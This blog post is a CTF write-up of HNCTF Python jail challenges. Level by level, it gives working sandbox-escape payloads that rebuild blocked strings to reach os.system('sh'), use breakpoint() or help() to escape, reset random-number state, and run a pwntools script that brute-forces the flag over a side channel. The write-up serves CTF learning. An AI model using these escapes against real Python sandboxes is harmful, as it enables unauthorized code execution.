
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        <title>pythonJail | Moyao の小屋</title>
        <meta name="author" content="Moyao">
        <meta name="description" content="Write down something interesting I met">
        <meta name="keywords" content="">
        <link rel="icon" href="/images/head.jpg">
        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
        
        <link rel="stylesheet" href="/css/fonts.min.css">
        <link rel="stylesheet" href="/css/particlex.css">
        
        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
    <meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
        <div id="layout">
            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
            <transition name="into">
                <div v-show="show_page" style="display: -not-none">
                    <div id="menu_show">
                         
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">Moyao の小屋</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;home</span>
        </a>
        
        <a href="/https://github.com/DeMoYao100">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;about</span>
        </a>
        
        <a href="/\tags.md">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;tags</span>
        </a>
        
    </div>
    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
        <div :class="'title'" @click="menu_show = !menu_show">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;Moyao の小屋</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="menu_show">
            
            <a href="">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
                </div>
            </a>
            
            <a target="_blank" rel="noopener" href="https://github.com/DeMoYao100">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
                </div>
            </a>
            
            <a href="\tags.md">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>
                    </div>
                    <div id="main">
                        
<div class="article">
    <div>
        <h1>pythonJail </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2022/11/1
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
            </span>
            
            <span class="tag">
                
                <a href="/tags/ctf/" style="color: #00a596">
                    ctf
                </a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/jail/" style="color: #ffa2c4">
                    jail
                </a>
            </span>
            
        </span>
        
    </div>
    <div class="content" v-pre>
        <h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h5 id="Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail"><a href="#Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail" class="headerlink" title="Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problemspythonJail."></a>Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h5><h3 id="LEVEL-1"><a href="#LEVEL-1" class="headerlink" title="LEVEL 1"></a>LEVEL 1</h3><p><img src="/2022/11/01/pythonJail/level1.png" alt="level1"></p>
<h5 id="From-the-function-filter-we-sees-that-the-symbol-“-‘-i-b-is-banned-Which-means-Show-subclasses-with-tuple-class-base-subclasses"><a href="#From-the-function-filter-we-sees-that-the-symbol-“-‘-i-b-is-banned-Which-means-Show-subclasses-with-tuple-class-base-subclasses" class="headerlink" title="From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple)  ().\__class\__.\__base\__.\__subclasses\__()"></a>From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple) <code> ().\__class\__.\__base\__.\__subclasses\__()</code></h5><h5 id="is-not-allowed-What’s-more-symbol-‘-and-“-is-banned-so-it-come-to-us-that-we-may-can-use-chr-to-splicing-a-string-that-we-wanted"><a href="#is-not-allowed-What’s-more-symbol-‘-and-“-is-banned-so-it-come-to-us-that-we-may-can-use-chr-to-splicing-a-string-that-we-wanted" class="headerlink" title="is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use chr to splicing a string that we wanted."></a>is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use <code>chr</code> to splicing a string that we wanted.</h5><h5 id="Two-possible-payload"><a href="#Two-possible-payload" class="headerlink" title="Two possible payload:"></a>Two possible payload:</h5><blockquote>
<p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>(().<em>_class</em><em>.__base</em><em>.__subclasses__()[-4].__init__.__globals</em>_<a href="'sh'">‘system’</a>)</p>
</blockquote>
<blockquote>
<p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()</p>
</blockquote>
<h5 id="from-thisBlog"><a href="#from-thisBlog" class="headerlink" title="from thisBlog"></a>from <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578986988">thisBlog</a></h5><p><img src="/2022/11/01/pythonJail/level1wp.png" alt="level1pos"></p>
<h3 id="LEVEL-2"><a href="#LEVEL-2" class="headerlink" title="LEVEL 2"></a>LEVEL 2</h3><p><img src="/2022/11/01/pythonJail/level2.png" alt="level1"></p>
<h5 id="The-length-of-the-payload-is-limited-to-13"><a href="#The-length-of-the-payload-is-limited-to-13" class="headerlink" title="The length of the payload is limited to 13."></a>The length of the payload is limited to 13.</h5><h5 id="The-answer-according-to-空白-is-the-function-“breakpoint-”-which-I-didn’t-figure-out-yet-However-there-is-another-way-Use-eval-input-so-that-the-program-receive-once-again-for-your-input-Seems-a-little-bit-like-cmd-system-POST-1-1-ls-to-escape-the-filter-in-php-right"><a href="#The-answer-according-to-空白-is-the-function-“breakpoint-”-which-I-didn’t-figure-out-yet-However-there-is-another-way-Use-eval-input-so-that-the-program-receive-once-again-for-your-input-Seems-a-little-bit-like-cmd-system-POST-1-1-ls-to-escape-the-filter-in-php-right" class="headerlink" title="The answer according to 空白 is the function “breakpoint()”, which I didn’t figure out yet. However, there is another way. Use eval(input()) so that the program receive once again for your input! Seems a little bit like /?cmd=system($_POST[1]);$1=ls to escape the filter in php right?"></a>The answer according to 空白 is the function <c style="color: #FF0000">“breakpoint()”</c>, which I didn’t figure out yet. However, there is another way. Use <code>eval(input())</code> so that the program receive once again for your input! Seems a little bit like <code>/?cmd=system($_POST[1]);$1=ls</code> to escape the filter in php right?</h5><h3 id="LEVEL-3"><a href="#LEVEL-3" class="headerlink" title="LEVEL 3"></a>LEVEL 3</h3><p><img src="/2022/11/01/pythonJail/level3.png" alt="level3"></p>
<h5 id="This-time-the-maximum-length-of-our-payload-is-down-to-7"><a href="#This-time-the-maximum-length-of-our-payload-is-down-to-7" class="headerlink" title="This time, the maximum length of our payload is down to 7."></a>This time, the maximum length of our payload is down to 7.</h5><h5 id="I-didn’t-quite-understand-yet-but-function-help-can-help-you-passby-the-7-words-limit-Here-is-when-I-tried-others’-payload-quite-amazing-and-when-I-am-available-I-shall-come-back-to-study-it"><a href="#I-didn’t-quite-understand-yet-but-function-help-can-help-you-passby-the-7-words-limit-Here-is-when-I-tried-others’-payload-quite-amazing-and-when-I-am-available-I-shall-come-back-to-study-it" class="headerlink" title="I didn’t quite understand yet, but function help() can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it."></a>I didn’t quite understand yet, but function <code>help()</code> can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it.</h5><blockquote>
</blockquote>
<p><img src="/2022/11/01/pythonJail/level3wp.png" alt="level3"></p>
<h3 id="PYTHON2-INPUT-JAIL"><a href="#PYTHON2-INPUT-JAIL" class="headerlink" title="PYTHON2 INPUT JAIL"></a>PYTHON2 INPUT JAIL</h3><p><img src="/2022/11/01/pythonJail/input(jail).png" alt="input(jail)"></p>
<h5 id="python2-another-thing-I-am-not-familiar-with…"><a href="#python2-another-thing-I-am-not-familiar-with…" class="headerlink" title="python2, another thing I am not familiar with…"></a>python2, another thing I am not familiar with…</h5><h5 id="Looking-up-others’-write-up…"><a href="#Looking-up-others’-write-up…" class="headerlink" title="Looking up others’ write up…"></a>Looking up others’ write up…</h5><p><img src="/2022/11/01/pythonJail/input(jail)wp.png" alt="input(jail)"></p>
<h3 id="LEVEL-2-5"><a href="#LEVEL-2-5" class="headerlink" title="LEVEL 2.5"></a>LEVEL 2.5</h3><p><img src="/2022/11/01/pythonJail/level2.5.png" alt="level2.5"></p>
<h5 id="We-can-use-breakpoint-to-go-into-pdb-and-rce-is-possible"><a href="#We-can-use-breakpoint-to-go-into-pdb-and-rce-is-possible" class="headerlink" title="We can use breakpoint() to go into pdb, and rce is possible."></a>We can use <code>breakpoint()</code> to go into pdb, and rce is possible.</h5><h3 id="LAKE"><a href="#LAKE" class="headerlink" title="LAKE"></a>LAKE</h3><p><img src="/2022/11/01/pythonJail/lake.png" alt="lake"></p>
<h6 id="Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’"><a href="#Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’" class="headerlink" title="Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)"></a>Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)</h6><h5 id="Use-globals-to-leak-the-key-And-then-get-shell"><a href="#Use-globals-to-leak-the-key-And-then-get-shell" class="headerlink" title="Use globals() to leak the key. And then get shell."></a>Use <code>globals()</code> to leak the key. And then get shell.</h5><h3 id="L-KE"><a href="#L-KE" class="headerlink" title="L@KE"></a>L@KE</h3><p><img src="/2022/11/01/pythonJail/l@ke.png" alt="l@ke"></p>
<h6 id="Another-strange-christen…"><a href="#Another-strange-christen…" class="headerlink" title="Another strange christen…"></a>Another strange christen…</h6><h5 id="The-maxinum-length-of-payload-is-now-6-so-only-help-is-possible"><a href="#The-maxinum-length-of-payload-is-now-6-so-only-help-is-possible" class="headerlink" title="The maxinum length of payload is now 6, so only help() is possible."></a>The maxinum length of payload is now 6, so only <code>help()</code> is possible.</h5><h5 id="But-unlike-cases-above-this-time-module-‘os’-is-destory-or-whatever-Now-we-comes-to-the-base-reason-why-we-use-‘os’-above-help-can-actually-get-you-into-any-module-in-the-python-file-which-includes-main-And-surely-the-key-can-be-found-inside"><a href="#But-unlike-cases-above-this-time-module-‘os’-is-destory-or-whatever-Now-we-comes-to-the-base-reason-why-we-use-‘os’-above-help-can-actually-get-you-into-any-module-in-the-python-file-which-includes-main-And-surely-the-key-can-be-found-inside" class="headerlink" title="But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above. help() can actually get you into any module in the python file, which includes __main__! And surely, the key can be found inside."></a>But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above. <code>help()</code> can actually get you into any module in the python file, which includes <code>__main__</code>! And surely, the key can be found inside.</h5><br>
#### OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.
<br>


<h3 id="LEVEL-5"><a href="#LEVEL-5" class="headerlink" title="LEVEL 5"></a>LEVEL 5</h3><p><img src="/2022/11/01/pythonJail/level5.png" alt="level5"></p>
<h5 id="Just-rce-can-give-you-the-flag-unexpected-Later-we-will-see-how-it-shall-really-be-work-out"><a href="#Just-rce-can-give-you-the-flag-unexpected-Later-we-will-see-how-it-shall-really-be-work-out" class="headerlink" title="Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out."></a>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.</h5><h3 id="LEVEL-4"><a href="#LEVEL-4" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="Why-is-it-4-after-5-I-don’t-know…"><a href="#Why-is-it-4-after-5-I-don’t-know…" class="headerlink" title="(Why is it 4 after 5 I don’t know…)"></a>(Why is it 4 after 5 I don’t know…)</h6><h5 id="4-bytes-rce-seems-impossible-so-lets-just-guass-it-use-os-system-input-data-to-get-your-input-and-bingo"><a href="#4-bytes-rce-seems-impossible-so-lets-just-guass-it-use-os-system-input-data-to-get-your-input-and-bingo" class="headerlink" title="4 bytes rce, seems impossible, so lets just guass it use os.system(input_data) to get your input and bingo."></a>4 bytes rce, seems impossible, so lets just guass it use <code>os.system(input_data)</code> to get your input and bingo.</h5><p><img src="/2022/11/01/pythonJail/level4.png" alt="level4"></p>
<h3 id="LAkE"><a href="#LAkE" class="headerlink" title="LAkE"></a>LAkE</h3><p><img src="/2022/11/01/pythonJail/laKelaKe.png" alt="laKe"></p>
<h5 id="This-time-it-imports-sys-module-with-audit-hook-and-direct-RCE-function-like-pty-spawn、os-system、os-exec、os-posix-spawn、os-spawn、subprocess-Popen-is-not-available-Whats-more-compile、eval、exec、open-is-unfetchable-However-there-use-random-setstate-to-generate-its-random-number-which-is-base-on-Mersenne-Twister-and-is-crackable-In-general-if-we-got-the-state-of-the-random-number-generator-we-can-generate-the-same-number-That-leads-two-problems-There-is-only-one-‘eval’-in-the-server-code-but-we-need-to-execute-more-How-to-restore-the-state-BEFORE-the-random-number-is-generated"><a href="#This-time-it-imports-sys-module-with-audit-hook-and-direct-RCE-function-like-pty-spawn、os-system、os-exec、os-posix-spawn、os-spawn、subprocess-Popen-is-not-available-Whats-more-compile、eval、exec、open-is-unfetchable-However-there-use-random-setstate-to-generate-its-random-number-which-is-base-on-Mersenne-Twister-and-is-crackable-In-general-if-we-got-the-state-of-the-random-number-generator-we-can-generate-the-same-number-That-leads-two-problems-There-is-only-one-‘eval’-in-the-server-code-but-we-need-to-execute-more-How-to-restore-the-state-BEFORE-the-random-number-is-generated" class="headerlink" title="This time it imports sys module with audit hook, and direct RCE function like pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen is not available. Whats more, compile、eval、exec、open is unfetchable. However, there use random.setstate() to generate its random number, which is base on Mersenne Twister, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?"></a>This time it imports <code>sys</code> module with <a target="_blank" rel="noopener" href="https://peps.python.org/pep-0578/">audit hook</a>, and direct RCE function like <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code> is not available. Whats more, <code>compile、eval、exec、open</code> is unfetchable. However, there use <code>random.setstate()</code> to generate its random number, which is base on Mersenne <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95">Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?</h5><h5 id="First-we-need-to-know-a-thing-named-Assignment-Expresions-in-python-or-rather-walrus-operator-Then-we-package-those-formula-in-a-list-They-will-be-calculate-from-left-to-right-As-for-function-we-can-replace-it-with-lambda-Some-case-can-be-view-below"><a href="#First-we-need-to-know-a-thing-named-Assignment-Expresions-in-python-or-rather-walrus-operator-Then-we-package-those-formula-in-a-list-They-will-be-calculate-from-left-to-right-As-for-function-we-can-replace-it-with-lambda-Some-case-can-be-view-below" class="headerlink" title="First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with lambda. Some case can be view below:"></a>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with <code>lambda</code>. Some case can be view below:</h5><pre><code>https://ctftime.org/writeup/21982

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
</code></pre>
<h5 id="Second-if-we-import-random-and-print-random-getstate-at-the-beginning-we-got-a-tuple-back-which-may-look-like-3-624-None-The-first-value-‘3’-and-the-last-value-‘None’-is-fixed-Only-624-numbers-in-the-middle-is-changed-So-if-we-assign-the-conter-zero-we-get-the-random-number"><a href="#Second-if-we-import-random-and-print-random-getstate-at-the-beginning-we-got-a-tuple-back-which-may-look-like-3-624-None-The-first-value-‘3’-and-the-last-value-‘None’-is-fixed-Only-624-numbers-in-the-middle-is-changed-So-if-we-assign-the-conter-zero-we-get-the-random-number" class="headerlink" title="Second, if we import random and print random.getstate at the beginning, we got a tuple back. which may look like:(3, (..., 624), None). The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number."></a>Second, if we <code>import random</code> and print <code>random.getstate</code> at the beginning, we got a tuple back. which may look like:<code>(3, (..., 624), None)</code>. The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.</h5><h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[random:=\_\_import__(&#39;random&#39;), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
</code></pre>
<h3 id="LEVEL-5-1"><a href="#LEVEL-5-1" class="headerlink" title="LEVEL 5.1"></a>LEVEL 5.1</h3><h5 id="Dued-to-the-unexpected-solves-in-level5-crazyman-gives-another-problem-stating-level5-1"><a href="#Dued-to-the-unexpected-solves-in-level5-crazyman-gives-another-problem-stating-level5-1" class="headerlink" title="Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1."></a>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.</h5><h5 id="nc-and-dir-as-it-tells-you-to-found-my-flag-try-list-getattr-my-flag-39-flag-got-a-AttributeError-39-flag-level5-39-object-has-no-attribute-39-flag-39-So-payload-is-list-getattr-my-flag-39-flag-level5-39"><a href="#nc-and-dir-as-it-tells-you-to-found-my-flag-try-list-getattr-my-flag-39-flag-got-a-AttributeError-39-flag-level5-39-object-has-no-attribute-39-flag-39-So-payload-is-list-getattr-my-flag-39-flag-level5-39" class="headerlink" title="nc and dir()(as it tells you to), found my_flag, try list(getattr(my_flag,&#39;flag)), got a AttributeError: &#39;flag_level5&#39; object has no attribute &#39;flag&#39;. So payload is list(getattr(my_flag,&#39;flag_level5&#39;))"></a><code>nc</code> and <code>dir()</code>(as it tells you to), found <code>my_flag</code>, try <code>list(getattr(my_flag,&#39;flag))</code>, got a <code>AttributeError: &#39;flag_level5&#39; object has no attribute &#39;flag&#39;</code>. So payload is <code>list(getattr(my_flag,&#39;flag_level5&#39;))</code></h5><h5 id="Another-way-to-solve-this-problem-though-quite-similar-the-latter-gets-its-shell"><a href="#Another-way-to-solve-this-problem-though-quite-similar-the-latter-gets-its-shell" class="headerlink" title="Another way to solve this problem(though quite similar, the latter gets its shell)"></a>Another way to solve this problem(though quite similar, the latter gets its shell)</h5><p><img src="/2022/11/01/pythonJail/level5.1_1.png" alt="level5.1_1"><br><img src="/2022/11/01/pythonJail/level5.1_2.png" alt="level5.1_2"></p>
<h3 id="LAK3"><a href="#LAK3" class="headerlink" title="LAK3"></a>LAK3</h3><p><img src="/2022/11/01/pythonJail/lak3.png" alt="lak3"></p>
<h5 id="Same-as-before-we-can-use-the-excate-same-payload-Though-the-official-payload-provides-by-crazyman-is-import-39-sys-39-getframe-1-f-locals-39-right-guesser-question-answer-39"><a href="#Same-as-before-we-can-use-the-excate-same-payload-Though-the-official-payload-provides-by-crazyman-is-import-39-sys-39-getframe-1-f-locals-39-right-guesser-question-answer-39" class="headerlink" title="Same as before, we can use the excate same payload. Though the official payload provides by crazyman is __import__(&#39;sys&#39;)._getframe(1).f_locals[&#39;right_guesser_question_answer&#39;]"></a>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is <code>__import__(&#39;sys&#39;)._getframe(1).f_locals[&#39;right_guesser_question_answer&#39;]</code></h5><h5 id="a-good-blog-can-refer"><a href="#a-good-blog-can-refer" class="headerlink" title="a good blog can refer"></a><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/21982">a good blog can refer</a></h5><h3 id="tyPe-Ch-nnEl"><a href="#tyPe-Ch-nnEl" class="headerlink" title="tyPe Ch@nnEl"></a>tyPe Ch@nnEl</h3><p><img src="/2022/11/01/pythonJail/sideChannel.png" alt="sideChannel"></p>
<h5 id="I-haven’t-quite-understand-yet-So-I-will-put-the-payload-beforehand"><a href="#I-haven’t-quite-understand-yet-So-I-will-put-the-payload-beforehand" class="headerlink" title="I haven’t quite understand yet. So I will put the payload beforehand:"></a>I haven’t quite understand yet. So I will put the payload beforehand:</h5><h5 id="One-possible"><a href="#One-possible" class="headerlink" title="One possible:"></a>One possible:</h5><pre><code>from pwn import *
from tqdm import trange

class Gao:
    def __init__(self):
        self.known = &#39;&#39;

def init(self):
    # self.conn = process([&#39;python3&#39;, &#39;./server_type.py&#39;])
    self.conn = remote(&#39;1.14.71.254&#39;, 28563)

def gao(self):
    payload = &#39;((1)if(type(flag.split())(flag.encode()).pop(&#123;pos&#125;)^&#123;val&#125;)else(True))&#39;
    i = len(self.known)
    while True:
        for j in trange(32, 128):
            cur_payload = payload.format(pos=i, val=j)
            self.init()
            self.conn.sendlineafter(&#39;Payload:&#39;, cur_payload)
            s = self.conn.recvline()
            self.conn.close()
            if (b&#39;Try&#39; in s):
                return
            elif (b&#39;bool&#39; in s):
                self.known += chr(j)
                print(self.known)
                print(self.known)
                print(self.known)
                break
        else:
            raise Exception(&#39;GG simida&#39;)            
        i += 1
if __name__ == &#39;__main__&#39;:
    g = Gao()
    g.gao()
</code></pre>
<h5 id="↑-Can-took-some-time-when-I-tried"><a href="#↑-Can-took-some-time-when-I-tried" class="headerlink" title="↑ Can took some time(when I tried)"></a>↑ Can took some time(when I tried)</h5><h5 id="Officail"><a href="#Officail" class="headerlink" title="Officail:"></a>Officail:</h5><pre><code>for i in range(len(flag), len(flag)+100): # flag length
for guess in chars: # all possible chars
    print(&quot;guess: &quot;, bytes(flag), chr(guess))
    payload = f&quot;type(type(flag).mro())(type(type(flag).mro())(flag).pop(&#123;i&#125;).encode()).remove(&#123;guess&#125;)&quot;
</code></pre>
<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="level-4-again"><a href="#level-4-again" class="headerlink" title="level 4 again"></a>level 4 again</h6><p><img src="/2022/11/01/pythonJail/level4_1.png" alt="level4_1"></p>
<h5 id="Quite-similar-as-before-just-use-bytes-decode-to-pass-the-black-list"><a href="#Quite-similar-as-before-just-use-bytes-decode-to-pass-the-black-list" class="headerlink" title="Quite similar as before, just use bytes().decode() to pass the black list."></a>Quite similar as before, just use <code>bytes().decode()</code> to pass the black list.</h5><p><img src="/2022/11/01/pythonJail/level4wp1.png" alt="level4_1wp1"><br><img src="/2022/11/01/pythonJail/level4wp2.png" alt="level4_1wp2"></p>
<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h5><pre><code>().__class__.__base__.__subclasses__()
</code></pre>
<h5 id><a href="#" class="headerlink" title></a></h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())
</code></pre>
<h5 id="There-is-another-solution-to-this-problem-I-am-not-sure-I-fully-understand-it-so-I-put-a-link-here-beforehand"><a href="#There-is-another-solution-to-this-problem-I-am-not-sure-I-fully-understand-it-so-I-put-a-link-here-beforehand" class="headerlink" title="There is another solution to this problem: I am not sure I fully understand it, so I put a link here beforehand."></a>There is another solution to this problem: I am not sure I fully understand it, so I put a <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/579057932">link</a> here beforehand.</h5><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
</code></pre>
<p><img src="/2022/11/01/pythonJail/level4wp_3.png" alt="level4wp3"></p>
<h3 id="LEVEL-4-0-5"><a href="#LEVEL-4-0-5" class="headerlink" title="LEVEL 4.0.5"></a>LEVEL 4.0.5</h3><h5 id="Same-payload-as-last-one"><a href="#Same-payload-as-last-one" class="headerlink" title="Same payload as last one."></a>Same payload as last one.</h5><p><img src="/2022/11/01/pythonJail/level4.0.5.png" alt="level4.0.5"></p>
<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4.1"></a>LEVEL 4.1</h3><h5 id="Quite-same-as-before"><a href="#Quite-same-as-before" class="headerlink" title="Quite same as before."></a>Quite same as before.</h5><p><img src="/2022/11/01/pythonJail/level4.1wp1.png" alt="level4.1"></p>
<h5 id="Ps-the-bytes-is-now-banned-but-still-you-can-use-show-subclassed-with-tuples-to-replace-like-this"><a href="#Ps-the-bytes-is-now-banned-but-still-you-can-use-show-subclassed-with-tuples-to-replace-like-this" class="headerlink" title="Ps, the bytes is now banned, but still you can use show subclassed with tuples to replace, like this:"></a>Ps, the <code>bytes</code> is now banned, but still you can use <code>show subclassed with tuples</code> to replace, like this:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
</code></pre>
<h3 id="LEVEL-4-2"><a href="#LEVEL-4-2" class="headerlink" title="LEVEL 4.2"></a>LEVEL 4.2</h3><h5 id="Quite-same-as-before-1"><a href="#Quite-same-as-before-1" class="headerlink" title="Quite same as before.."></a>Quite same as before..</h5><p><img src="/2022/11/01/pythonJail/level4.2wp.png" alt="level4.2"></p>
<h5 id="Or-rather-use-join"><a href="#Or-rather-use-join" class="headerlink" title="Or rather use join:"></a>Or rather use <code>join</code>:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
</code></pre>
<h3 id="LEVEL-4-3"><a href="#LEVEL-4-3" class="headerlink" title="LEVEL 4.3"></a>LEVEL 4.3</h3><h5 id="Quite-same-as-before…"><a href="#Quite-same-as-before…" class="headerlink" title="Quite same as before…"></a>Quite same as before…</h5><p><img src="/2022/11/01/pythonJail/level4.3wp.png" alt="level4.3"></p>
<br>
#### The next few levels are become harder and harder.
<br>

<h3 id="LEVEL-6"><a href="#LEVEL-6" class="headerlink" title="LEVEL 6"></a>LEVEL 6</h3><h4 id="repetition"><a href="#repetition" class="headerlink" title="repetition:"></a>repetition:</h4><p><img src="/2022/11/01/pythonJail/level6wp1.png" alt="level6wp1"><br><img src="/2022/11/01/pythonJail/level6wp2.png" alt="level6wp2"><br><img src="/2022/11/01/pythonJail/level6wp3.png" alt="level6wp3"></p>
